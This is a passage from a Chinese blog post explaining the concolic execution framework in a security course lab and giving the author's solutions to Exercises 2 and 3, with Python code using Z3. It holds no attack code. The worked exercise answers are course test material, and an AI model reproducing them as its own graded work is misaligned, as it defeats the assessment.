function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Or(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_not</span>(<span class="hljs-title class_ inherited__">sym_unop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Not(z3expr(self.a))<br></code></pre></td></tr></table></figure><p>符号数的加减乘除比较等操作都是基于上面封装的 <code>op</code> 类完成的：</p><blockquote><p>乘除等运算需要我们在后续的 Exercise 中自行实现</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_lt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &lt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_gt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &gt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_plus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) + z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_minus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) - z3expr(self.b)<br></code></pre></td></tr></table></figure><h4 id="III-常量"><a href="#III-常量" class="headerlink" title="III. 常量"></a>III. 常量</h4><p>字符串常量 <code>const_str</code> 、整型常量 <code>const_int</code> 、布尔常量 <code>const_bool</code> 的实现比较简单，主要就是继承自 <code>sym_ast</code> 并且储存对应的值，其中字符串常量在转为 Z3 表达式时会调用 <code>z3.StringVal()</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, v</span>):<br>    self.v = v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.v == o.v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.v)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.StringVal(self.v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, i</span>):<br>    self.i = i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.i == o.i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.i)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.i<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_bool</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, b</span>):<br>    self.b = b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_bool):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.b == o.b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.b)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.b<br></code></pre></td></tr></table></figure><h4 id="IV-符号变量"><a href="#IV-符号变量" class="headerlink" title="IV. 符号变量"></a>IV. 符号变量</h4><p>在该框架中定义了两种类型的符号变量：<code>sym_int</code> 与 <code>sym_str</code>，都是直接基础自 AST 节点类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Arithmetic</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Int(self.<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment">###...</span><br><br><span class="hljs-comment">## String operations</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Const(self.<span class="hljs-built_in">id</span>, z3.StringSort())<br></code></pre></td></tr></table></figure><h4 id="V-混合变量"><a href="#V-混合变量" class="headerlink" title="V. 混合变量"></a>V. 混合变量</h4><p>正如前文所言，我们实际上在混合执行引擎当中使用的为混合型（concolic）的变量来储存约束值，框架中提供了三种类型的混合变量——<code>concolic_int</code> （整型）、 <code>concolic_str</code>（字符串）、<code>concolic_bytes</code>（字符数组），其中具体值（conctre value）存放在 <code>__v</code> 成员中，符号值（symbolic value）存放在 <code>__sym</code> 中</p><p>主要是<strong>大量的运算符重载</strong>，这里就不贴完整代码了，可以自己去看（笑）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_int</span>(<span class="hljs-title class_ inherited__">int</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    self = <span class="hljs-built_in">super</span>(concolic_int, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">## ...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_str</span>(<span class="hljs-title class_ inherited__">str</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">str</span><br>    self = <span class="hljs-built_in">super</span>(concolic_str, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_bytes</span>(<span class="hljs-title class_ inherited__">bytes</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">bytes</span><br>    self = <span class="hljs-built_in">super</span>(concolic_bytes, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><hr><p>接下来是 Exercise 2：通过增加整型乘法与除法支持来完成对 <code>symex/fuzzy.py</code> 中 <code>concolic_int</code> 的实现，我们需要重载额外的方法并为乘除法运算添加 AST 节点，并为这些 AST 节点应用 <code>_z3expr</code></p><blockquote><p><strong>Exercise 2.</strong> Finish the implementation of <code>concolic_int</code> by adding support for integer multiply and divide operations. You will need to overload additional methods in the <code>concolic_int</code> class (see the documentation for <a href="https://docs.python.org/3/library/operator.html">operator functions in Python 3</a>), add AST nodes for multiply and divide operations, and implement <code>_z3expr</code> appropriately for those AST nodes.</p><p>Look for the comments <code>Exercise 2: your code here</code> in <code>symex/fuzzy.py</code> to find places where we think you might need to write code to solve this exercise.</p><p>Run <strong>.&#x2F;check-concolic-int.py</strong> or <strong>make check</strong> to check that your changes to <code>concolic_int</code> work correctly.</p></blockquote><p>我们首先实现符号变量乘除所需的 <code>sym_binop</code> 子类，这里我们参照前面的加减运算直接调用 <code>z3expr()</code> 来返回 Z3 表达式即可</p><p>需要注意的是虽然 python 的除法运算有 <code>/</code> 与 <code>//</code>两种，但是 Z3并不支持 <code>ArithRef</code> 与 <code>int</code> 直接进行 <code>//</code> 运算，所以这里我们只实现一个普通的乘法即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement AST nodes for division and multiplication.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_mul</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) * z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_div</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) / z3expr(self.b)<br></code></pre></td></tr></table></figure><p>接下来我们重写 <code>concolic_int</code> 的乘法与除法，我们先参考一下 <code>concolic_int </code>中的加法运算方式：、</p><ul><li>首先判断运算对象是否为 <code>concolic_int</code> ，若是则将自身具体值加上对象具体值，否则直接加上该对象，结果存放到 <code>res</code></li><li>创建一个新的 <code>concolic_int</code> 实例作为返回值，<code>res</code> 作为其具体值部分，创建两个 <code>ast</code> 实例并利用 <code>sym_plus()</code> 计算结果作为新 concolic_int 的符号值部分</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v + o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v + o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_plus(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>那么我们的乘除法其实依葫芦画瓢即可，这里需要注意的是我们要同时实现 <code>/</code> 与 <code>//</code> 两种除法运算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement symbolic division and multiplication.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v * o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v * o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_mul(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__truediv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v / o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v / o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__floordiv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v // o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v // o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 2：</p><p><img src="https://s2.loli.net/2022/12/18/TBNqmRi5fVsFlCk.png" alt="image.png"></p><p>然后是 Exercise 3，主要是让我们熟悉混合执行系统的使用方式，这里提供的途径是修改 <code>symex_exercises.py</code> 以给予测试系统正确的输入：</p><blockquote><p><strong>Exercise 3.</strong> An important component of concolic execution is <code>concolic_exec_input()</code> in <code>symex/fuzzy.py</code>. We have given you the implementation. You will use it to build a complete concolic execution system. To understand how to use <code>concolic_exec_input()</code>, you should create an input such that you pass the first check in <code>symex/check-symex-int.py</code>. Don’t modify <code>symex/check-symex-int.py</code> directly, but instead modify <code>symex_exercises.py</code>. Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>混合执行框架的核心组件便是 <code>symex/fuzzy.py</code>  中的  <code>concolic_exec_input()</code> ，题目说后续我们将用其实现一个完整的混合执行系统，那我们先来看其相关的具体实现</p><h3 id="混合执行框架代码浅析-Part-2"><a href="#混合执行框架代码浅析-Part-2" class="headerlink" title="混合执行框架代码浅析  - Part 2"></a>混合执行框架代码浅析  - Part 2</h3><h4 id="VI-具体值字典-ConcreteValues"><a href="#VI-具体值字典-ConcreteValues" class="headerlink" title="VI.具体值字典 - ConcreteValues"></a>VI.具体值字典 - ConcreteValues</h4><p>如前文所言，在混合执行下被测试的程序输入都存储在一个全局字典中，实为一个<code>ConctreteValues</code> 类对象，实际上就是 python 字典的一个 wrapper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ConcreteValues maintains a dictionary of variables name to values.</span><br><span class="hljs-comment"># If a variable is created and it doesn&#x27;t exist, we use a default</span><br><span class="hljs-comment"># value for the variable (0 for int and &#x27;&#x27; for string).</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteValues</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>    self.concrete_values = &#123;&#125;<br></code></pre></td></tr></table></figure><p>在 <code>symex/fuzzy.py</code> 中有一个全局变量 <code>current_concrete_values</code>，实际上就是我们前面所说的全局具体值字典，我们可以使用<code>ConctreteValues.mk_global()</code> 使该对象变为全局引用，即我们每次使用只需要创建一个<code>ConctreteValues</code> 对象即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># During concolic execution, new variables will be added to</span><br><span class="hljs-comment"># current_concrete_values, which is an instance of ConcreteValues.</span><br><span class="hljs-comment"># This variable is global because application code, the concolic</span><br><span class="hljs-comment"># Execution engine, and test code, all create new variables.  We make</span><br><span class="hljs-comment"># it global so that we don&#x27;t have to modify application code.  At the</span><br><span class="hljs-comment"># start of a concolic execution we will set this variable to the</span><br><span class="hljs-comment"># concrete values to be used.</span><br><br>current_concrete_values=<span class="hljs-literal">None</span><br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_global</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">global</span> current_concrete_values<br>    current_concrete_values = self<br></code></pre></td></tr></table></figure><p>在该类中有三个查询字典内 id 对应具体值并返回混合值的函数，若 id 不在字典内则进行添加，同时在 <code>symex/fuzzy.py</code> 中带有三个对这些函数的 wrapper：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_int(sym_int(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_str(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_bytes(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br><span class="hljs-comment">#...</span><br><br><span class="hljs-comment"># Wrapper functions to allow application code to create new</span><br><span class="hljs-comment"># variables. They will be added to the current global current</span><br><span class="hljs-comment"># concrete values.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_int(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_str(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_bytes(<span class="hljs-built_in">id</span>, initval)<br></code></pre></td></tr></table></figure><p>除了上面的函数以外，也可以直接使用 <code>add()</code> 成员函数来向字典内添加映射：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, v</span>):<br>  self.concrete_values[<span class="hljs-built_in">id</span>] = v<br></code></pre></td></tr></table></figure><p>以及还有一个 <code>canonical_rep()</code> 成员函数用以返回字典中的键值对元组排序列表，以及 <code>var_names()</code> 用以返回 id 列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">canonical_rep</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(self.concrete_values.items())<br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">var_names</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.concrete_values.keys()<br></code></pre></td></tr></table></figure><p>以及一个 <code>inherit()</code> 成员函数用以从另一个字典中拷贝键值对：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">inherit</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> o.concrete_values:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = o.concrete_values[<span class="hljs-built_in">id</span>]<br></code></pre></td></tr></table></figure><h4 id="VII-concolic-exec-input-输入执行"><a href="#VII-concolic-exec-input-输入执行" class="headerlink" title="VII. concolic_exec_input() - 输入执行"></a>VII. concolic_exec_input() - 输入执行</h4><p>该函数内容用以根据给予的字典对传入的函数进行执行，整体逻辑比较简单：</p><ul><li>初始化两个全局空列表 <code>cur_path_constr</code> （<strong>当前路径的条件约束</strong>）与 <code>cur_path_constr_callers</code>（当前路径的信息）</li><li>调用 <code>concrete_values.mk_global()</code> 使其成为一个全局字典</li><li>调用传入的函数指针来获得一个值 <code>v</code>，若参数 <code>verbose &gt; 1</code> 则打印两个列表的内容</li><li>最后的返回值为 <code>(v, cur_path_constr, cur_path_constr_callers)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolically execute testfunc with the given concrete_values. It</span><br><span class="hljs-comment"># returns the value testfunc computes for the given concrete_values</span><br><span class="hljs-comment"># and the branches it encountered to compute that result.</span><br><span 